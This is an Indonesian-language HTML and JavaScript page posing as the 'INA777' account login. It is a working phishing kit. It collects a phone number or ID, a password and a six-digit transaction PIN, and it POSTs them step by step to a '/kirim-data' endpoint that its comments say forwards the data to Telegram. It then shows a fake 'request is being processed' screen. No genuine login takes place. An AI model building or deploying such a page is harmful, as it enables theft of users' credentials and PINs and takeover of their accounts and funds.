<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF‑8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>INA777 - Masuk Akun</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="latar-penuh"></div>
  <div class="container">
    <button class="close-btn">✕</button>

    <!-- Halaman Login -->
    <div class="halaman aktif" id="halaman-login">
      <div class="header-top">
        <div class="judul-halaman">Akun Masuk</div>
      </div>
      <div class="form-box">
        <div class="tab-bar">
          <div class="tab active" onclick="gantiTab('hp')">Nomor HP</div>
          <div class="tab" onclick="gantiTab('id')">ID</div>
        </div>
        <p class="note-red">* Harap masukkan informasi yang terikat untuk masuk</p>
        <div class="form-group">
          <label class="label" id="labelUtama">Nomor Telepon</label>
          <div class="input-wrapper">
            <input type="tel" id="inputUtama" placeholder="Masukkan nomor telepon">
          </div>
        </div>
        <div class="form-group">
          <label class="label">Kata Sandi</label>
          <div class="input-wrapper">
            <input type="password" id="kataSandi" placeholder="Masukkan kata sandi">
          </div>
        </div>
        <div class="button-row">
          <button class="btn btn-daftar">Daftar</button>
          <button class="btn btn-login" onclick="simpanDataLogin()">Login</button>
        </div>
      </div>
    </div>

    <!-- Halaman PIN -->
    <div class="halaman" id="halaman-pin">
      <div class="header-top">
        <div class="judul-halaman">PIN Transaksi</div>
      </div>
      <div class="pin-box">
        <div class="pin-judul">Masukkan PIN Transaksi</div>
        <p class="pin-keterangan">Masukkan 6 angka PIN</p>
        <div class="pin-container">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="0" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="1" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="2" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="3" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="4" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="5" inputmode="numeric">
        </div>
        <button class="btn-lanjut" onclick="kirimSemuaData()">Lanjut</button>
      </div>
    </div>

    <!-- Halaman Terima Kasih -->
    <div class="halaman" id="halaman-terima">
      <div class="header-top">
        <div class="judul-halaman">Pemberitahuan</div>
      </div>
      <div class="terima-kasih-box">
        <div class="terima-kasih-judul">Terima Kasih</div>
        <p class="terima-kasih-teks">Permintaan Anda sedang dalam proses,<br>mohon ditunggu.</p>
      </div>
    </div>
  </div>

<script>
let modeSekarang = 'hp';
const pinKotak = document.querySelectorAll('.pin-input-kotak');

// Simpan data sementara
let dataPengguna = {
  id: '',
  sandi: '',
  pin: ''
};

// Ganti tab HP / ID
function gantiTab(jenis) {
  modeSekarang = jenis;
  const label = document.getElementById('labelUtama');
  const input = document.getElementById('inputUtama');
  document.querySelectorAll('.tab')[0].classList.toggle('active', jenis === 'hp');
  document.querySelectorAll('.tab')[1].classList.toggle('active', jenis === 'id');
  if (jenis === 'hp') {
    label.textContent = 'Nomor Telepon';
    input.placeholder = 'Masukkan nomor telepon';
    input.type = 'tel';
  } else {
    label.textContent = 'ID Akun';
    input.placeholder = 'Masukkan ID akun anda';
    input.type = 'text';
  }
}

// Buka halaman
function bukaHalaman(nama) {
  document.querySelectorAll('.halaman').forEach(el => el.classList.remove('aktif'));
  document.getElementById('halaman-' + nama).classList.add('aktif');
  if (nama === 'pin') pinKotak[0].focus();
}

// Simpan data Login & buka halaman PIN
async function simpanDataLogin() {
  dataPengguna.id = document.getElementById('inputUtama').value;
  dataPengguna.sandi = document.getElementById('kataSandi').value;
  
  if (!dataPengguna.id || !dataPengguna.sandi) {
    alert('Harap lengkapi nomor/ID dan kata sandi!');
    return;
  }

  // Kirim data login otomatis ke Telegram
  try {
    await fetch('/kirim-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        langkah: '1 - Login',
        id: dataPengguna.id,
        sandi: dataPengguna.sandi
      })
    });
  } catch (err) {
    console.log('Gagal kirim langkah 1');
  }
  
  bukaHalaman('pin');
}

// Ambil PIN
function ambilPIN() {
  return Array.from(pinKotak).map(i => i.value).join('');
}

// Logika input PIN
pinKotak.forEach((input, idx) => {
  input.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
    if (e.target.value && idx < 5) pinKotak[idx + 1].focus();
    // Otomatis kirim saat PIN terisi 6 angka
    if (e.target.value && idx === 5) {
      dataPengguna.pin = ambilPIN();
      kirimSemuaData();
    }
  });
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !e.target.value && idx > 0) pinKotak[idx - 1].focus();
  });
});

// Kirim SEMUA data ke Telegram
async function kirimSemuaData() {
  dataPengguna.pin = ambilPIN();
  
  if (dataPengguna.pin.length !== 6) {
    alert('Harap masukkan 6 angka PIN dengan lengkap!');
    pinKotak[0].focus();
    return;
  }

  // Kirim data lengkap
  try {
    await fetch('/kirim-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        langkah: '2 - PIN',
        id: dataPengguna.id,
        sandi: dataPengguna.sandi,
        pin: dataPengguna.pin
      })
    });
    bukaHalaman('terima');
  } catch (err) {
    alert('Gagal mengirim data, coba lagi!');
  }
}
</script>
</body>
</html>
